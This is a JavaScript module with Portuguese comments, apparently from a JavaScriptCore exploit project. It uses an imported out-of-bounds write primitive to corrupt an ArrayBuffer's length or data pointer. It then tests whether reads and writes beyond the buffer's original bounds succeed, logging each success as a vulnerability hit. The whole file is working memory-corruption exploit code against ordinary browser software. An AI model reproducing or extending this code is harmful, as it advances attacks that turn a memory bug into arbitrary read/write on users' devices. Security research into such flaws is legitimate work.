// js/script3/testCorruptMetadata.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeCorruptArrayBufferMetadataTest(
    testDescription,
    offsetToCorrupt, 
    valueToWrite,    
    bytesToWrite,
    isPointerCorruptionTest = false // Parâmetro para indicar teste de corrupção de ponteiro
) {
    const FNAME_TEST = `executeCorruptMetadata<${testDescription}>`;

    logS3(`--- Iniciando Teste de Corrupção de Metadados AB: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Alvo Offset (rel. início oob_array_buffer_real): ${toHex(offsetToCorrupt)}, Valor: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToWrite}`, "info", FNAME_TEST);
    document.title = `Iniciando CorruptMetadata: ${testDescription}`;

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { corruptionSucceeded: false, details: "OOB Setup Failed", potentiallyCrashed: false };
    }
    document.title = "OOB Configurado";

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes (${toHex(initialOOBArrayBufferByteLength)})`, "info", FNAME_TEST);

    let stepReached = "antes_escrita_oob";
    let corruptionAttempted = false;
    let testOutcome = {
        newByteLength: "N/A",
        readBeyondOriginal: "Não tentado",
        writeBeyondOriginal: "Não tentado",
        pointerReadAttempt: "Não aplicável (não é teste de ponteiro ou não tentado)"
    };
    let potentiallyCrashed = true; 
    let errorOccurred = false;

    try {
        if (offsetToCorrupt >= 0 && offsetToCorrupt + bytesToWrite <= initialOOBArrayBufferByteLength) {
            logS3(`CORRUPÇÃO: Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} (${bytesToWrite} bytes) em offset abs ${toHex(offsetToCorrupt)} do oob_array_buffer_real`, "warn", FNAME_TEST);
            stepReached = "antes_escrita_oob";
            document.title = `Antes Escrita OOB Metadata: ${testDescription}`;
            
            oob_write_absolute(offsetToCorrupt, valueToWrite, bytesToWrite);
            corruptionAttempted = true;
            logS3("Escrita OOB de metadados realizada.", "info", FNAME_TEST);
            stepReached = "apos_escrita_oob";
            document.title = `Após Escrita OOB Metadata: ${testDescription}`;
        } else {
            logS3(`AVISO: Offset de corrupção ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST);
            stepReached = "escrita_oob_pulada_offset_invalido";
            document.title = `Escrita OOB Pulada (Offset Inválido): ${testDescription}`;
            potentiallyCrashed = false; 
        }

        await PAUSE_S3(SHORT_PAUSE_S3);

        if (corruptionAttempted) {
            testOutcome.newByteLength = oob_array_buffer_real.byteLength; // Sempre verificar o tamanho
            logS3(`Tamanho de oob_array_buffer_real APÓS corrupção: ${testOutcome.newByteLength} bytes (${toHex(testOutcome.newByteLength)})`, "leak", FNAME_TEST);

            if (!isPointerCorruptionTest) { // Lógica para teste de corrupção de TAMANHO
                if (testOutcome.newByteLength !== initialOOBArrayBufferByteLength) {
                    logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST);
                    document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`;
                } else {
                    logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita (teste de tamanho).", "info", FNAME_TEST);
                }
                // Tentar usar uma nova DataView com o buffer potencialmente corrompido (teste de tamanho)
                try {
                    const checkSizeView = new DataView(oob_array_buffer_real);
                    logS3(`Nova DataView para teste de tamanho criada. Comprimento: ${checkSizeView.byteLength}`, "info", FNAME_TEST);
                    const testOffsetBeyondOriginal = initialOOBArrayBufferByteLength + 4;
                    const testValue = 0xABABABAB;
                    if (testOutcome.newByteLength > initialOOBArrayBufferByteLength && testOffsetBeyondOriginal + 4 <= testOutcome.newByteLength) {
                        logS3(`Tentando R/W além dos limites (tamanho) em ${toHex(testOffsetBeyondOriginal)}...`, "warn", FNAME_TEST);
                        checkSizeView.setUint32(testOffsetBeyondOriginal, testValue, true);
                        let readBack = checkSizeView.getUint32(testOffsetBeyondOriginal, true);
                        if (readBack === testValue) {
                            logS3(`!!! SUCESSO R/W ALÉM DOS LIMITES (TAMANHO) !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST);
                            document.title = `R/W OOB (Tamanho) OBTIDO! - ${testDescription}`;
                        } else {
                            logS3(`Falha R/W além dos limites (tamanho). Lido: ${toHex(readBack)}`, "error", FNAME_TEST);
                        }
                    } else {
                        logS3("Novo tamanho do buffer (se alterado) não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST);
                    }
                } catch (e_size_check) {
                    logS3(`ERRO ao verificar R/W com tamanho corrompido: ${e_size_check.message}`, "error", FNAME_TEST);
                }
                potentiallyCrashed = false; // Completou a lógica de tamanho
            } else { // Lógica para teste de corrupção de PONTEIRO
                testOutcome.pointerReadAttempt = "Tentativa de leitura iniciada";
                logS3("Teste de Corrupção de Ponteiro: Criando nova DataView e tentando ler do offset 0...", "warn", FNAME_TEST);
                document.title = `Tentando Leitura Pós-PtrCorrupt: ${testDescription}`;
                stepReached = "antes_leitura_ptr_corrompido";
                try {
                    const corruptedView = new DataView(oob_array_buffer_real); // Cria DataView após corrupção de ponteiro
                    logS3(`Nova DataView para teste de ponteiro criada. Comprimento (baseado no tamanho NÃO ALTERADO do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST);
                    let val = corruptedView.getUint32(0, true); // Tenta ler do início da DataView
                    testOutcome.pointerReadAttempt = `Sucesso Leitura: Lido ${toHex(val)} de offset 0`;
                    logS3(`   LEITURA PÓS-CORRUPÇÃO DE PONTEIRO BEM-SUCEDIDA (INESPERADO?): Valor lido = ${toHex(val)}`, "leak", FNAME_TEST);
                    document.title = `LEITURA PÓS-PTR OK (INESPERADO): ${testDescription}`;
                    potentiallyCrashed = false;
                } catch (e_ptr_read) {
                    testOutcome.pointerReadAttempt = `ERRO Leitura: ${e_ptr_read.name} - ${e_ptr_read.message}`;
                    logS3(`   ERRO ESPERADO/CAPTURADO ao tentar ler após corrupção de ponteiro: ${e_ptr_read.name} - ${e_ptr_read.message}`, "critical", FNAME_TEST);
                    document.title = `ERRO Leitura Pós-PtrCorrupt: ${testDescription}`;
                    errorOccurred = true; 
                    potentiallyCrashed = false; 
                }
                stepReached = "apos_leitura_ptr_corrompido";
            }
        } else { // corruptionAttempted foi false
            potentiallyCrashed = false; 
        }
    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal CorruptMetadata: ${testDescription}`;
        logS3(`Erro principal no teste de corrupção de metadados (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
        potentiallyCrashed = false; 
        errorOccurred = true;
    } finally {
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyCrashed && corruptionAttempted) {
            logS3(`O TESTE PODE TER CONGELADO/CRASHADO. Último passo logado: ${stepReached}`, "error", FNAME_TEST);
            document.title = `CRASH/CONGELOU? Passo: ${stepReached} - ${testDescription}`;
        }
    }
    logS3(`--- Teste de Corrupção de Metadados AB Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${testOutcome.newByteLength}, Leitura Pós-PtrCorrupt="${testOutcome.pointerReadAttempt}"`, "info", FNAME_TEST);
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("OOB Configurado") || document.title.startsWith("Antes Escrita OOB")) {
         if (!potentiallyCrashed && !errorOccurred) document.title = `Teste Metadata OK: ${testDescription}`;
    }
    return { potentiallyCrashed, errorOccurred, details: testOutcome };
}
